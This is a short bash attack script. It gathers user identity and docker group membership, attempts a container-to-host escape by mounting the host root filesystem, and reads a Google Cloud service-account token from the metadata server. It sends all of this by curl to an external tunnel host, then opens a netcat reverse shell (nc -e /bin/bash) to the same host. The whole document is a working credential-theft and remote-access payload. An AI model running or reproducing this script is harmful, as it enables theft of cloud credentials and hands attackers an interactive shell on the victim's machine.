#!/bin/bash
URL_LOGS="https://0533655478ef9549-103-95-173-85.serveousercontent.com"
# Note: You will need to create a second tunnel for the shell
SHELL_HOST="0533655478ef9549-103-95-173-85.serveousercontent.com" 

{
  echo "--- IDENTITY ---"
  id; groups | grep -o 'docker'
  echo "--- HOST ESCAPE ---"
  IMG=$(sudo docker images -q | head -n 1)
  sudo docker run --rm -v /:/host:ro $IMG hostname 2>/dev/null
  echo "--- GCP TOKEN ---"
  curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity
  sleep 2
} | curl -X POST -H "Content-Type: text/plain" --data-binary @- "$URL_LOGS"

# Interactive Reverse Shell using Netcat (nc)
# This will try to connect to your second tunnel on Port 80 (which forwards to your Mac Port 9000)
nc -e /bin/bash "$SHELL_HOST" 80 &
